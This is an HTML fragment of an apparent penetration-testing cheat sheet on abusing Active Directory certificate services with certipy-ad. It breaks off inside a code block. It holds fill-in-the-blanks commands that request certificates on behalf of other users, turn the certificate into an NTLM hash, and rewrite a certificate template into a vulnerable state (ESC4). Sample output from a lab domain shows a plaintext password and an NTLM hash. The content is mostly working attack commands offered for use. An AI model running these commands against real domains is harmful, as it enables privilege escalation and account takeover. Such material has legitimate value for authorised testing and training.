</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'User' -pfx '<span class="o editable-keyword">&lt;USER&gt;</span>.pfx' -on-behalf-of '<span class="o editable-keyword">&lt;DOMAIN_NETBIOS_NAME&gt;</span>\<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'User' -pfx '<span class="o editable-keyword">&lt;USER&gt;</span>.pfx' -on-behalf-of '<span class="o editable-keyword">&lt;DOMAIN_NETBIOS_NAME&gt;</span>\<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'User' -pfx '<span class="o editable-keyword">&lt;USER&gt;</span>.pfx' -on-behalf-of '<span class="o editable-keyword">&lt;DOMAIN_NETBIOS_NAME&gt;</span>\<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'User' -pfx '<span class="o editable-keyword">&lt;USER&gt;</span>.pfx' -on-behalf-of '<span class="o editable-keyword">&lt;DOMAIN_NETBIOS_NAME&gt;</span>\<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="3-get-ntlm-hash">3. Get NTLM Hash</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad auth -pfx <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>.pfx -domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div></div></div><p></p>
<hr>
<h3 id="esc4-template-hijacking">ESC4: Template Hijacking</h3>
<p class="tabs">
<button data-tabset="set9" data-tabcontent="tab1" class="active">Linux</button>

<button data-tabset="set9" data-tabcontent="tab2">Windows</button>

</p><div class="tabset-wrapper" data-tabset-group="set9"><div class="tabcontent active" data-tabset="set9" data-tabcontent="tab1"><h4 id="1-modify-template-to-esc1-vulnerable-state">1. Modify Template to ESC1 Vulnerable State</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad template -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -template '<span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>' -write-default-configuration -no-save
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad template -u <span class="s1">'clifford.davey'</span> -p <span class="s1">'RFmoB2WplgE_3p'</span> -target dc.sendai.vl -dc-ip 10.129.234.66 -template <span class="s1">'SendaiComputer'</span> -write-default-configuration -no-save
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Updating certificate template 'SendaiComputer'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Replacing:
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     flags: 66104
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIDefaultKeySpec: 2
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIKeyUsage: b'\x86\x00'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIMaxIssuingDepth: -1
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Enrollment-Flag: 0
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Private-Key-Flag: 16
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Certificate-Name-Flag: 1
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Minimal-Key-Size: 2048
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
</span></span></span><span class="line"><span class="cl"><span class="go">Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully updated 'SendaiComputer'
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad template -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -template '<span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>' -write-default-configuration -no-save
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad template -u <span class="s1">'clifford.davey'</span> -hashes <span class="s1">'13cee2652d9af0b63e3ebda229edf2ed'</span> -target dc.sendai.vl -dc-ip 10.129.234.66 -template <span class="s1">'SendaiComputer'</span> -write-default-configuration -no-save
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Updating certificate template 'SendaiComputer'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Replacing:
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     flags: 66104
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIDefaultKeySpec: 2
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIKeyUsage: b'\x86\x00'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIMaxIssuingDepth: -1
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Enrollment-Flag: 0
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Private-Key-Flag: 16
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Certificate-Name-Flag: 1
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Minimal-Key-Size: 2048
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
</span></span></span><span class="line"><span class="cl"><span class="go">Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully updated 'SendaiComputer'
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad template -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -template '<span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>' -write-default-configuration -no-save
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad template -u <span class="s1">'clifford.davey@sendai.vl'</span> -p <span class="s1">'RFmoB2WplgE_3p'</span> -k -target dc.sendai.vl -dc-ip 10.129.234.66 -dc-host dc.sendai.vl -ns 10.129.234.66 -template <span class="s1">'SendaiComputer'</span> -write-default-configuration -no-save
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Updating certificate template 'SendaiComputer'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Replacing:
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     flags: 66104
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIDefaultKeySpec: 2
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIKeyUsage: b'\x86\x00'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIMaxIssuingDepth: -1
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Enrollment-Flag: 0
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Private-Key-Flag: 16
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Certificate-Name-Flag: 1
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Minimal-Key-Size: 2048
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
</span></span></span><span class="line"><span class="cl"><span class="go">Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully updated 'SendaiComputer'
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad template -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -template '<span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>' -write-default-configuration -no-save
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad template -u <span class="s1">'clifford.davey@sendai.vl'</span> -hashes <span class="s1">'13cee2652d9af0b63e3ebda229edf2ed'</span> -k -target dc.sendai.vl -dc-ip 10.129.234.66 -dc-host dc.sendai.vl -ns 10.129.234.66 -template <span class="s1">'SendaiComputer'</span> -write-default-configuration -no-save
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Updating certificate template 'SendaiComputer'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Replacing:
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     flags: 66104
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIDefaultKeySpec: 2
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIKeyUsage: b'\x86\x00'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIMaxIssuingDepth: -1
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Enrollment-Flag: 0
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Private-Key-Flag: 16
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Certificate-Name-Flag: 1
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Minimal-Key-Size: 2048
</span></span></span><span class="line"><span class="cl"><span class="go">[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
</span></span></span><span class="line"><span class="cl"><span class="go">Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully updated 'SendaiComputer'
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad template -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -template '<span class="o editable-keyword">&lt;VULN_TEMPLATE&gt;</span>' -write-default-configuration -no-save
